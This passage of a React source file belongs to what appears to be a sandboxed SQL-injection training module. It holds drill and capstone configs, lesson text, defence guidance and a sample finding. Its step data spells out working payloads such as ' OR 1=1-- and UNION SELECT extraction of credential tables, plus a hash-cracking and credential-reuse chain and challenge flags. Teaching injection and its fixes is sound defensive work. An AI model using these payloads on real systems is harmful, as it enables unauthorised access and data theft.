      login: { table: "drivers", select: "id, email, role", emailCol: "email", passCol: "pass", adminRole: "admin", roleIdx: 2 },
      search: { table: "parcels", select: "id, tracking, status", searchCol: "tracking" },
    },
    steps: [
      {
        surface: "login", goal: "First, the driver portal. Log in with no valid password.",
        palette: ["'", " OR 1=1", "--"],
        hint: "The front-door move: close the string, force it true, comment out the rest. Email field; password blank.",
        skeleton: "' OR ___ --", reveal: "' OR 1=1--",
        done: (r) => !!r.authed,
      },
      {
        surface: "search", goal: "Now the public parcel-tracking search on the same database. Count its columns before you UNION.",
        palette: ["'", " ORDER BY 1", " ORDER BY 2", " ORDER BY 3", " ORDER BY 4", "--"],
        hint: "' ORDER BY 4-- errors (no 4th column), ' ORDER BY 3-- works - so 3 columns.",
        skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 3--",
        done: (r, input) => /order\s+by\s+3\b/i.test(input) && r.error == null,
      },
      {
        surface: "search", goal: "Three columns. UNION the drivers table out through the tracking box - email, pass, role.",
        palette: ["'", " UNION SELECT ", "email", "pass", "role", ",", " FROM drivers", "--"],
        hint: "Match the three columns, from the drivers table: email, pass, role.",
        skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT email, pass, role FROM drivers--",
        done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@tollgate.range"))),
      },
    ],
    success: "A login bypass AND a UNION leak on one target - you chained both surfaces into a full database read, start to finish, unguided. That's the whole job. Finding logged.",
  },
];

function DrillSurface({ cfg, onSolved }: { cfg: DrillCfg; onSolved: () => void }) {
  const [sc, setSc] = useState<ScenarioRange | null>(null);
  const [si, setSi] = useState(0);
  const [val, setVal] = useState("");
  const [pass, setPass] = useState("");
  const [res, setRes] = useState<(RangeRunResult & { authed?: boolean }) | null>(null);
  const [showHint, setShowHint] = useState(false);
  const [solved, setSolved] = useState(false);
  const [stepCleared, setStepCleared] = useState(false);

  useEffect(() => {
    let live = true;
    bootScenario(cfg.spec).then((s) => live && setSc(s)).catch(() => {});
    return () => { live = false; };
  }, [cfg]);

  const step = cfg.steps[si];
  const multi = cfg.steps.length > 1;

  function run() {
    if (!sc) return;
    const r = step.surface === "login" ? sc.attemptLogin(val, pass) : sc.search(val);
    setRes(r);
    if (step.done(r, val)) {
      if (si + 1 < cfg.steps.length) setStepCleared(true);
      else { setSolved(true); onSolved(); }
    }
  }
  function nextStep() { setSi(si + 1); setVal(""); setPass(""); setRes(null); setShowHint(false); setStepCleared(false); }

  return (
    <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
      <div style={{ padding: "14px 16px", borderBottom: `1px solid ${C.lineSoft}` }}>
        <div style={{ fontFamily: DISP, fontWeight: 700, fontSize: 15.5, color: C.ink }}>{cfg.client}</div>
        <p style={{ color: C.soft, fontSize: 13.5, lineHeight: 1.55, margin: "6px 0 0" }}>{cfg.brief}</p>
        <div style={{ fontSize: 13.5, color: C.indigo2, marginTop: 8 }}>▸ {multi ? <b style={{ fontFamily: MONO, fontSize: 11.5 }}>Step {si + 1}/{cfg.steps.length}: </b> : null}{G(step.goal, `drill-${cfg.host}-${si}`)}</div>
      </div>
      <WinBar host={cfg.host} />
      <div style={{ padding: 18 }}>
        {step.surface === "login" ? (
          <>
            <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={val} onChange={(e) => setVal(e.target.value)} placeholder="name@…" /></div>
            <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={pass} onChange={(e) => setPass(e.target.value)} placeholder="(leave blank)" /></div>
          </>
        ) : (
          <div style={{ marginBottom: 14 }}><label style={lab}>search</label><input style={inp} value={val} onChange={(e) => setVal(e.target.value)} placeholder="search…" /></div>
        )}
        <Palette tokens={step.palette} onInsert={(t) => setVal(val + t)} />
        <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 14 }}>
          <Btn tone="i" onClick={run} disabled={!sc || solved || stepCleared}>{step.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
          <button onClick={() => setVal("")} style={{ background: "none", border: "none", color: C.soft, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>clear</button>
        </div>
        {res && <ResultView r={res} />}
        {stepCleared && !solved && (
          <div className="co-anim co-pop" style={{ marginTop: 13, display: "flex", alignItems: "center", gap: 14, flexWrap: "wrap", padding: "11px 14px", borderRadius: 10, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55` }}>
            <span style={{ fontFamily: MONO, fontSize: 12.5, color: C.green, fontWeight: 700 }}>✓ Step {si + 1} cleared</span>
            <Btn tone="g" onClick={nextStep} style={{ marginLeft: "auto" }}>Next step →</Btn>
          </div>
        )}
        {!solved && !stepCleared && (
          <div style={{ marginTop: 12 }}>
            {!showHint ? (
              <button onClick={() => setShowHint(true)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>hint</button>
            ) : (
              <div style={{ padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>
                {step.hint}
                <div style={{ marginTop: 7, display: "flex", gap: 14, flexWrap: "wrap" }}>
                  <button onClick={() => setVal(step.skeleton)} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button>
                  <button onClick={() => setVal(step.reveal)} style={{ background: "none", border: "none", color: C.mute, fontFamily: MONO, fontSize: 12, cursor: "pointer" }}>reveal the full answer</button>
                </div>
              </div>
            )}
          </div>
        )}
        {solved && <div className="co-anim co-pop" style={{ marginTop: 13, padding: "11px 14px", borderRadius: 10, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55`, fontSize: 13, color: "#bff3d3", lineHeight: 1.5 }}>✓ {cfg.success}</div>}
      </div>
    </div>
  );
}

function ConsolidationDrills({ onDone }: { onDone: () => void }) {
  const [i, setI] = useState(0);
  const [solved, setSolved] = useState<boolean[]>(DRILLS.map(() => false));
  const cfg = DRILLS[i];
  function onSolved() { const n = [...solved]; n[i] = true; setSolved(n); }
  return (
    <div style={{ display: "grid", gap: 14 }}>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        {DRILLS.map((d, k) => (
          <div key={d.client} style={{ display: "flex", alignItems: "center", gap: 7, padding: "5px 11px", borderRadius: 999, border: `1px solid ${k === i ? C.indigo : C.lineSoft}`, background: solved[k] ? "rgba(85,217,140,.08)" : k === i ? "rgba(139,123,255,.07)" : "transparent" }}>
            <span style={{ fontFamily: MONO, fontSize: 10.5, color: solved[k] ? C.green : k === i ? C.indigo2 : C.mute, fontWeight: 700 }}>{solved[k] ? "✓" : `drill ${k + 1}`}</span>
          </div>
        ))}
      </div>
      <DrillSurface key={cfg.client} cfg={cfg} onSolved={onSolved} />
      {solved[i] && (
        <div style={{ display: "flex" }}>
          <Btn tone="g" onClick={() => { if (i + 1 < DRILLS.length) setI(i + 1); else onDone(); }} style={{ marginLeft: "auto" }}>{i + 1 < DRILLS.length ? "Next drill →" : "On to the debrief →"}</Btn>
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── capstone challenge ─────────────────────────
 * A full, unguided engagement that chains everything: bypass a login -> UNION
 * out the staff table (hashes) -> crack the admin's hash -> log back in with
 * the real password (credential reuse). The two injection steps give ONE hint
 * and a structure scaffold but NO full auto-reveal, so even someone who knows
 * the move has to type it - this is the part that fills the clock. */

const CAP_SPEC: ScenarioSpec = {
  setup: `CREATE TABLE tickets (id INTEGER PRIMARY KEY, subject TEXT, status TEXT);
          INSERT INTO tickets (subject,status) VALUES ('Password reset','open'),('Billing query','closed'),('Login issue','open');
          CREATE TABLE staff (id INTEGER PRIMARY KEY, email TEXT, passhash TEXT, role TEXT);
          INSERT INTO staff (email,passhash,role) VALUES
            ('a.flint@vantage.range','3b5a9c2f1e8d4a7b6c0f9e2d1a4b7c8e','admin'),
            ('r.cole@vantage.range','9f1e2d3c4b5a6978e0d1c2b3a4958677','staff');`,
  login: { table: "staff", select: "id, email, role", emailCol: "email", passCol: "passhash", adminRole: "admin", roleIdx: 2 },
  search: { table: "tickets", select: "id, subject, status", searchCol: "subject" },
};
const ADMIN_EMAIL = "a.flint@vantage.range";
const ADMIN_HASH = "3b5a9c2f1e8d4a7b6c0f9e2d1a4b7c8e";
const ADMIN_PW = "Vantage2026!";
const RAINBOW: { word: string; hash: string }[] = [
  { word: "letmein", hash: "0d107d09f5bbe40cade3de5c71e9e9b7" },
  { word: "password1", hash: "7c6a180b36896a0a8c02787eeafb0e4c" },
  { word: "Vantage2026!", hash: ADMIN_HASH },
  { word: "summer23", hash: "5ebe2294ecd0e0f08eab7690d2a6ee69" },
  { word: "vantage", hash: "1b0c3e5a7d9f2b4c6e8a0d1f3b5c7e9a" },
];
const CAP_FLAG = "flag{cr4ck3d_and_reus3d}";

type CapStep = { key: string; title: string; surface: "login" | "search"; goal: string; palette: string[]; hint: string; skeleton: string; done: (r: RangeRunResult & { authed?: boolean }) => boolean };
const CAP_STEPS: CapStep[] = [
  {
    key: "in", title: "Break in", surface: "login",
    goal: "Vantage Mutual's staff console builds its login query from your input. Get in with no password. (One hint and a structure if you need it - but no full reveal this time.)",
    palette: ["'", " OR 1=1", "--"], skeleton: "' OR ___ --",
    hint: "Same front-door move you've done all module: close the string, force it true, comment the rest. Email field; password blank.",
    done: (r) => !!r.authed,
  },
  {
    key: "dump", title: "Dump the hashes", surface: "search",
    goal: "Inside, the support-ticket search is injectable too, and it returns 3 columns. UNION the staff table out through it to pull every email, password hash and role.",
    palette: ["'", " UNION SELECT ", "email", "passhash", "role", ",", " FROM staff", "--"], skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --",
    hint: "3 columns, from the staff table: email, passhash, role.",
    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@vantage.range"))),
  },
];

function CapstoneChallenge({ onDone }: { onDone: () => void }) {
  const [sc, setSc] = useState<ScenarioRange | null>(null);
  const [phase, setPhase] = useState(0); // 0,1 = injection steps; 2 = crack; 3 = reuse
  const [capCleared, setCapCleared] = useState(false);
  const [email, setEmail] = useState(""); const [pass, setPass] = useState(""); const [term, setTerm] = useState("");
  const [res, setRes] = useState<(RangeRunResult & { authed?: boolean }) | null>(null);
  const [showHint, setShowHint] = useState(false);
  const [cracked, setCracked] = useState(false);
  const [crackMsg, setCrackMsg] = useState<string | null>(null);
  const [pick, setPick] = useState<number | null>(null);
  const [reEmail, setReEmail] = useState(""); const [rePass, setRePass] = useState("");
  const [won, setWon] = useState(false); const [reMsg, setReMsg] = useState<string | null>(null);

  useEffect(() => { let live = true; bootScenario(CAP_SPEC).then((s) => live && setSc(s)).catch(() => {}); return () => { live = false; }; }, []);
  if (!sc) return <div style={{ fontFamily: MONO, fontSize: 13, color: C.mute }}>// booting Vantage Mutual range…</div>;

  const step = phase < 2 ? CAP_STEPS[phase] : null;
  const field = step?.surface === "login" ? email : term;
  const setField = step?.surface === "login" ? setEmail : setTerm;

  function runStep() {
    if (!sc || !step) return;
    const r = step.surface === "login" ? sc.attemptLogin(email, pass) : sc.search(term);
    setRes(r);
    if (step.done(r)) setCapCleared(true);
  }
  function nextCapStep() { setRes(null); setShowHint(false); setEmail(""); setPass(""); setTerm(""); setCapCleared(false); setPhase(phase + 1); }
  function confirmCrack() {
    if (pick === null) return;
    const e = RAINBOW[pick];
    if (e.hash === ADMIN_HASH) { setCracked(true); setCrackMsg(`Cracked - ${ADMIN_EMAIL} : ${e.word}`); }
    else setCrackMsg(`"${e.word}" hashes to a different digest than the admin's. Line the two strings up and compare again.`);
  }
  function reuse() {
    if (reEmail.trim().toLowerCase() === ADMIN_EMAIL && rePass === ADMIN_PW) setWon(true);
    else setReMsg("Those aren't the admin's real credentials - use the email and the password you cracked.");
  }

  const pct = (phase / 4) * 100;
  return (
    <div style={{ display: "grid", gap: 14 }}>
      <div style={{ fontFamily: MONO, fontSize: 11, color: C.mute }}>Vantage Mutual · full engagement · step {Math.min(phase + 1, 4)} of 4</div>
      <div style={{ height: 6, borderRadius: 999, background: "rgba(255,255,255,0.07)", overflow: "hidden" }}><div style={{ height: "100%", width: `${pct}%`, background: `linear-gradient(90deg, ${C.indigo}, ${C.amber})`, transition: "width .4s" }} /></div>

      {step && (
        <>
          <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
            <b style={{ color: C.indigo2, fontFamily: DISP }}>{step.title}. </b>{G(step.goal, `cap-${step.key}`)}
          </div>
          <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
            <WinBar host={step.surface === "login" ? "console.vantage.range · staff login" : "console.vantage.range · ticket search"} />
            <div style={{ padding: 18 }}>
              {step.surface === "login" ? (
                <>
                  <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@vantage.range" /></div>
                  <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={pass} onChange={(e) => setPass(e.target.value)} placeholder="(leave blank)" /></div>
                </>
              ) : (
                <div style={{ marginBottom: 14 }}><label style={lab}>search tickets</label><input style={inp} value={term} onChange={(e) => setTerm(e.target.value)} placeholder="e.g. billing" /></div>
              )}
              <Palette tokens={step.palette} onInsert={(t) => setField(field + t)} />
              <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 14 }}>
                <Btn tone="i" onClick={runStep} disabled={capCleared}>{step.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
                <button onClick={() => setField("")} style={{ background: "none", border: "none", color: C.soft, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>clear</button>
              </div>
              {res && <ResultView r={res} />}
              {capCleared && (
                <div className="co-anim co-pop" style={{ marginTop: 13, display: "flex", alignItems: "center", gap: 14, flexWrap: "wrap", padding: "11px 14px", borderRadius: 10, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55` }}>
                  <span style={{ fontFamily: MONO, fontSize: 12.5, color: C.green, fontWeight: 700 }}>✓ Step {phase + 1} cleared</span>
                  <Btn tone="g" onClick={nextCapStep} style={{ marginLeft: "auto" }}>Next step →</Btn>
                </div>
              )}
              <div style={{ marginTop: 12, display: "flex", gap: 14, alignItems: "center", flexWrap: "wrap" }}>
                {!showHint ? (
                  <button onClick={() => setShowHint(true)} style={{ background: "none", border: "none", color: C.indigo2, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>hint</button>
                ) : (
                  <div style={{ padding: "9px 12px", borderLeft: `2px solid ${C.indigo}`, background: "rgba(139,123,255,0.05)", fontSize: 13, color: C.soft, lineHeight: 1.5 }}>
                    {step.hint}
                    <div style={{ marginTop: 7 }}><button onClick={() => setField(step.skeleton)} style={{ background: "none", border: "none", color: C.cyan, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>show the structure</button></div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </>
      )}

      {phase === 2 && (
        <>
          <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
            <b style={{ color: C.indigo2, fontFamily: DISP }}>Crack the admin's hash. </b>{G("You pulled the admin's password as a hash, not plain text. Hashes are one-way - but weak ones fall to a rainbow table (precomputed hash -> word). Find the word whose hash matches the admin's.", "cap-crack")}
          </div>
          <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, padding: 16 }}>
            <div style={{ fontFamily: MONO, fontSize: 12, color: C.soft, marginBottom: 12 }}>admin hash · <span style={{ color: C.amber }}>{ADMIN_HASH}</span></div>
            <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".1em", color: C.indigo, fontWeight: 700, marginBottom: 8 }}>⌦ RAINBOW TABLE · select the row whose digest matches, then confirm</div>
            <div style={{ display: "grid", gap: 6 }}>
              {RAINBOW.map((e, i) => {
                const isSel = pick === i;
                const matched = cracked && e.hash === ADMIN_HASH;
                return (
                  <button key={e.word} onClick={() => { if (!cracked) { setPick(i); setCrackMsg(null); } }} disabled={cracked} className="co-opt" style={{ textAlign: "left", display: "flex", justifyContent: "space-between", gap: 10, flexWrap: "wrap", padding: "8px 12px", borderRadius: 8, border: `1px solid ${matched ? C.green : isSel ? C.indigo : C.lineSoft}`, background: isSel && !cracked ? "rgba(139,123,255,0.09)" : C.carbon, color: C.soft, cursor: cracked ? "default" : "pointer" }}>
                    <span style={{ fontFamily: MONO, fontSize: 12.5, color: C.ink }}>{e.word}</span>
                    <span style={{ fontFamily: MONO, fontSize: 12, color: matched ? C.green : "#8fa0c8", wordBreak: "break-all" }}>{e.hash}</span>
                  </button>
                );
              })}
            </div>
            {crackMsg && <div style={{ marginTop: 10, fontFamily: MONO, fontSize: 12.5, color: cracked ? C.green : C.soft }}>{crackMsg}</div>}
            {!cracked && <div style={{ marginTop: 12 }}><Btn tone="i" onClick={confirmCrack} disabled={pick === null}>This digest matches the admin&apos;s →</Btn></div>}
            {cracked && <div style={{ marginTop: 12 }}><Btn tone="g" onClick={() => setPhase(3)}>Now reuse it →</Btn></div>}
          </div>
        </>
      )}

      {phase === 3 && (
        <>
          <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
            <b style={{ color: C.indigo2, fontFamily: DISP }}>Reuse the credentials. </b>{G("The injection got you in, but now you have the admin's REAL password. Log in the normal way as the admin - that's credential reuse, and it works anywhere they used the same password.", "cap-reuse")}
          </div>
          <div style={{ display: "flex", gap: 14, flexWrap: "wrap", alignItems: "center", padding: "13px 15px", borderRadius: 12, background: "rgba(85,217,140,0.06)", border: `1px solid ${C.green}44` }}>
            <div style={{ flex: "1 1 240px", minWidth: 220 }}>
              <div style={{ fontFamily: MONO, fontSize: 10, letterSpacing: ".1em", textTransform: "uppercase", color: C.green, fontWeight: 700, marginBottom: 7 }}>✓ What you recovered earlier</div>
              <div style={{ fontFamily: MONO, fontSize: 12.5, color: C.ink, lineHeight: 1.75 }}>email · <span style={{ color: C.green }}>{ADMIN_EMAIL}</span><br />password · <span style={{ color: C.green }}>{ADMIN_PW}</span></div>
              <div style={{ fontSize: 11.5, color: C.mute, marginTop: 6 }}>No need to memorise it, it is right here.</div>
            </div>
            <Btn tone="g" onClick={() => { setReEmail(ADMIN_EMAIL); setRePass(ADMIN_PW); setReMsg(null); }}>Fill these in →</Btn>
          </div>
          <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
            <WinBar host="console.vantage.range · staff login" />
            <div style={{ padding: 18 }}>
              <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={reEmail} onChange={(e) => setReEmail(e.target.value)} placeholder="the admin's email you found" /></div>
              <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={rePass} onChange={(e) => setRePass(e.target.value)} placeholder="the password you cracked" /></div>
              <Btn tone="g" onClick={reuse}>LOG IN AS ADMIN →</Btn>
              {reMsg && !won && <div style={{ marginTop: 11, fontFamily: MONO, fontSize: 12.5, color: C.red }}>{reMsg}</div>}
            </div>
          </div>
        </>
      )}

      {won && (
        <div className="co-anim co-pop" style={{ textAlign: "center", padding: "20px", borderRadius: 14, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55` }}>
          <div style={{ fontFamily: MONO, fontSize: 11, letterSpacing: ".2em", color: C.green, fontWeight: 700 }}>CHALLENGE COMPLETE</div>
          <div style={{ fontFamily: MONO, fontSize: 13.5, color: C.green, marginTop: 8 }}>{CAP_FLAG}</div>
          <p style={{ fontSize: 13.5, color: C.soft, lineHeight: 1.5, margin: "10px auto 14px", maxWidth: "48ch" }}>Bypass, dump, crack, reuse - a full real-world chain, start to finish, in your own hands.</p>
          <Btn tone="g" onClick={onDone}>Continue to the debrief →</Btn>
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── module def ───────────────────────── */

export const MODULE5: ModuleDef = {
  code: "M-05",
  moduleNo: 5,
  title: "Injection",
  client: "Northwind Foods",
  brief:
    "A deep engagement. Northwind Foods' staff portal and product shop both build their database queries straight from whatever you type. Your job is the full job: prove the weakness, break in, work out the shape of the data, read out the staff records, map what else is in there, lift the customer card data, and reach the one secret they really didn't want found. Then four field jobs for new clients, and a final challenge you run start to finish on your own. All for real.",
  industry: {
    tag: "One missed text box can hand an attacker a company's entire database. This is the flaw that does it.",
    motif: { pre: "WHERE email = '", hit: "' OR 1=1 --", post: "'", note: "you just walked in, no password" },
    learn: [
      "Spot a field where your text gets treated as part of the database's own commands.",
      "Walk past a login with no password, then read whole tables out through a search box.",
      "Chain small steps into a full database breach, the way a real engagement runs.",
      "The one fix that actually works, parameterised queries, and why filters never do.",
    ],
    realWorld:
      "Injection has sat behind some of the largest data breaches on record. A single field that builds its query from your text can expose every account, password and payment record a company holds. The flaw is cheap to fix and devastating to miss, which is why it has its own place on the OWASP Top 10, the industry's standard list of the most critical web risks.",
    now: {
      stat: "#5",
      body: "In OWASP's 2025 Top 10, injection ranks fifth, down from third in 2021. It has fallen because modern frameworks parameterise queries for you by default, but it is far from gone: it still turns up in older systems and anywhere queries are built by hand.",
    },
    ahead:
      "AI is bringing it back. Studies across 2025 and 2026 found that a large share of AI-generated code ships with known vulnerabilities, and that SQL written by language models is measurably exploitable. A newer attack, prompt-to-SQL, even turns an AI assistant's own answers into database attacks. As more code is written by AI, knowing how injection works, and how to shut it down, is becoming more valuable, not less.",
    role:
      "This is day-one knowledge for penetration testers, bug-bounty hunters and secure-code reviewers. Find and fix injection, and you protect the data of everyone who uses the app.",
    primer: {
      term: "SQL",
      what: "Almost every app keeps its information in a database, and it talks to that database in a language called SQL (Structured Query Language). The app sends a query, the database runs it, and it sends matching rows back. That is all a query is: a question asked of the data.",
      example: "SELECT name, email FROM users WHERE id = 42",
      returns: "This asks for the name and email of the user whose id is 42, and gets back that one row. Injection is sneaking your own text into a query like this so it does something it was never meant to, which is exactly what you will do next.",
    },
    roles: ["Penetration tester", "Bug-bounty hunter", "Secure-code reviewer", "Security engineer"],
    engines: [
      { name: "SQLite", color: "#4FB8E8", blurb: "The whole database in a single file. It is running right here inside this range.", here: true },
      { name: "MySQL", color: "#E8A33D", blurb: "Powers a huge share of the world's websites and apps." },
      { name: "PostgreSQL", color: "#6AA6E0", blurb: "The advanced open-source database engineers reach for." },
      { name: "SQL Server", color: "#E5534B", blurb: "Microsoft's database behind countless business systems." },
      { name: "Oracle", color: "#F0685C", blurb: "Runs some of the largest corporate and government systems." },
    ],
    headline: {
      masthead: "THE CYBER DISPATCH",
      dateline: "London · 2016 · UK regulator (ICO) public record",
      title: "Teenagers breach a broadband giant with one old flaw",
      body: "A SQL injection attack on TalkTalk, a real UK broadband company, reached the personal data of 156,959 customers, with bank account details taken in more than 15,000 cases. The vulnerable page was missing a security fix released three years earlier. The regulator called the breach avoidable and handed down a record £400,000 fine. Several of the people later arrested were teenagers.",
      stat: "156,959",
      statLabel: "customers exposed",
      why: "Why it matters: this is not a one-off. The very same flaw has breached banks, retailers, telecoms, hospitals and government bodies for over twenty years, which is exactly why learning to find and stop it is worth your time.",
    },
    recent: {
      year: "2023",
      title: "The same flaw, tens of millions of people",
      body: "A single SQL injection hole in MOVEit, a file-transfer tool, let one gang reach the data of over 2,000 organisations and tens of millions of people worldwide. Decades old, and still one of the biggest breaches of the year.",
    },
  },
  lesson: {
    blocks: [
      { h: "First - what's a database?", body: "Almost every app stores its information in a database: an organised store you can picture as a stack of spreadsheets. Each table is one sheet (a 'users' table, a 'products' table), and each row is one record. The app reads and writes it constantly - your login, your messages, your scores all live there. The app talks to the database in a language called SQL, by sending it a query." },
      { h: "How a login actually checks you", body: "When you log in, the app builds a query that means 'find the user whose email is X and whose password is Y'. If a row comes back, you're let in. Simple - but everything depends on HOW the app builds that query. If it glues your typed-in email straight into the SQL text, you're about to see what goes wrong." },
      { h: "Injection: when your words become commands", body: "Injection happens when your input is mixed into a command the app runs. If the app doesn't keep your input strictly as data, you can add characters that end the data and start new commands - so your input runs as code. SQL injection aims this at the database, and it's been one of the most damaging web weaknesses for twenty years." },
      { h: "Breaking out of the string", body: "Your email sits inside quotes in the query: …WHERE email = '<your input>'. Type a quote and you close that string early. Add OR 1=1 and you've bolted on a condition that is always true. Finish with -- and the database ignores the rest of the line, including the password check. The query returns rows it never should, and the app lets you in." },
      { h: "Reading other tables with UNION", body: "Breaking in is only stage one. The deeper move is UNION, which staples a second query onto the first and returns its results through the same page - so an injectable search box can be made to hand you entirely different tables: staff accounts, password hashes, secrets. The one rule: your UNION must select the same number of columns as the original query, which is why you count columns first." },
    ],
    Interactive: InputBecomesCodeLab,
    summary: [
      "A database is tables of rows; the app talks to it in SQL by sending a query.",
      "Injection = your input gets run as code because it's glued into the query.",
      "The break-in combo: a quote to close the string, OR 1=1 to force it true, -- to comment out the rest.",
      "UNION staples a second query on to read other tables - the column counts must match.",
      "The cure is always the same: keep input as data, never code.",
    ],
    check: {
      q: "An app builds its login query by joining your typed email straight into the SQL text. Why is that the dangerous part?",
      options: [
        { text: "Your input can close the text and the rest of what you type becomes part of the query's commands.", correct: true, feedback: "Right. The quote ends the data, so what follows is read as SQL, not as your email." },
        { text: "Your input stays data, but joining it on makes the query check the password before the email.", feedback: "No - the order of the checks isn't the issue, and your input doesn't stay data; it can become part of the command." },
        { text: "Your input can change the query, but only inside the part the developer wrapped in quotes.", feedback: "Close, but the quote lets you break OUT of that part - that's the whole point; nothing keeps you inside it." },
        { text: "Your input only becomes a command if it contains a SQL keyword like SELECT or UNION.", feedback: "No - a single quote plus OR 1=1 is enough; you don't need a big keyword to change the query." },
      ],
    },
  },
  glossary: GLOSSARY,
  scope: {
    target: "portal.northwind.range (login) + shop.northwind.range (search)",
    inScope: "both input fields; reading data via injection; the consolidation clients named in each drill",
    offLimits: "DROP/DELETE/UPDATE, other Northwind hosts, real data",
    timebox: "this session",
  },
  handler: "Seven stages, four field jobs, then one full challenge. Confirm it's injectable, walk in the front door, work out the shape of the data, then turn the search box into a window onto the whole database - staff, card records, and the vault. Try each yourself before the hints; if the typing trips you up, 'show the structure' drops a skeleton in for you to fill. Password field stays empty throughout; you're going around it.",
  hint: "This is a multi-stage engagement - work the stages in order. Each has a hint ladder, a 'show the structure' scaffold, and a last-resort reveal. The password field can stay empty; you're going around it, not guessing it.",
  plan: [
    { label: "Probe", goal: "Break the login with a single quote and confirm it throws a SQL error." },
    { label: "Bypass", goal: "Close the string, add OR 1=1, comment out the password, and walk straight in." },
    { label: "Count the columns", goal: "Climb ORDER BY until it errors to learn how many columns the search returns." },
    { label: "Extract staff", goal: "UNION out the staff table: emails, password hashes and roles." },
    { label: "Map the schema", goal: "UNION sqlite_master to list every table hiding in the database." },
    { label: "Lift the card data", goal: "UNION the orders table for customer names and card last-4 digits." },
    { label: "Crack the vault", goal: "UNION the secrets table to capture the flag." },
  ],
  Act: InjectionAct,
  Consolidation: ConsolidationDrills,
  Capstone: CapstoneChallenge,
  flag: "flag{un10n_t0_the_v4ult}",
  defend: {
    blocks: [
      { h: "The fix: parameterised queries", body: "Never build a query by gluing strings together. Use a parameterised query: write the query with placeholders, then hand the database your input separately. The database treats that input strictly as a value - never as part of the command - so ' OR 1=1-- becomes a (failed) login with a very odd email, and UNION payloads are just strange search terms." },
      { h: "Why 'just block bad words' fails", body: "A tempting shortcut is to strip quotes or ban the word UNION. It doesn't hold: attackers slip past blocklists with different encodings, odd capitalisation, or by splitting words - and meanwhile you've broken real input like the name O'Brien. Blocklists are a game of whack-a-mole. Parameterisation removes the whole category at once, which is why it's the real fix." },
      { h: "Defence in depth", body: "Parameterisation is the cure; these are the seatbelts. Give the app's database account only the permissions it needs, so even a successful injection can't read tables it shouldn't or delete anything. Validate input where it genuinely makes sense. And never show raw database errors to users - that error you triggered in stage one is exactly what tells an attacker the door is open." },
    ],
    Interactive: PickSafeQueryLab,
    check: {
      q: "A developer 'fixes' the login by deleting any single quotes from the input before building the query the same old way. Is that enough?",
      options: [
        { text: "No - the query is still glued together by hand, so other inputs (and numeric fields) still break it; parameterise instead.", correct: true, feedback: "Right. Removing one character is a blocklist; the real fix is to stop building SQL from input at all." },
        { text: "No - stripping quotes helps, but you also need to strip commas and the word UNION for it to be safe.", feedback: "Still a blocklist - attackers slip past with encodings and casing. Parameterise instead of chasing characters." },
        { text: "Yes - with the quotes removed, the input can't escape the data, so the query is safe.", feedback: "Not quite - numeric fields and encoded quotes still get through, and the query is still built by gluing." },
        { text: "Yes - as long as the same quote-stripping runs on every field, not just the login.", feedback: "Applying a blocklist everywhere is still a blocklist; it breaks real input and misses bypasses. Parameterise." },
      ],
    },
  },
  finding: {
    title: "SQL injection: auth bypass and full database read",
    where: "portal.northwind.range /login + shop.northwind.range /search",
    severity: "Critical",
    cvss: "9.8",
    impact: "Both the login and the product search build SQL from raw input. An attacker can log in with no password, read every staff record (emails and password hashes), enumerate the whole schema, and extract secrets from other tables via UNION - a complete compromise of the database.",
    fix: "Use parameterised queries everywhere; never concatenate input into SQL. Add least-privilege database accounts and suppress raw error output as defence in depth.",
  },
